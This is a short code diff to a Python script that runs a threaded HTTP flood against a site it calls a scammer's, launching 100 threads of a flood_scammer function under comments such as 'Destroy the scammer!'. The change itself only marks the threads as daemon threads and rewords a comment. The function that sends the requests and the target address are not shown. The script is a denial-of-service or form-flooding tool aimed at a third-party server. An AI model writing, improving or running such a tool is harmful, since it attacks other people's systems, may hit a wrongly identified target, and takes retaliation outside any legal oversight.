@@ -45,7 +45,7 @@ def flood_scammer():
 # Sets up and executes the HTTP flood against the scammer
 def execute_http_flood():
     # Use threading to speed up the number of posts made
-    threads = [Thread(target=flood_scammer) for _ in range(100)]
+    threads = [Thread(target=flood_scammer, daemon=True) for _ in range(100)]
     
     # Destroy the scammer!
     for thread in threads:
@@ -56,6 +56,6 @@ def execute_http_flood():
         thread.join()
 
 
-# Prevents unwanted code execution from importing the script
+# Execute the program if the script is run directly
 if __name__ == "__main__":
     execute_http_flood()
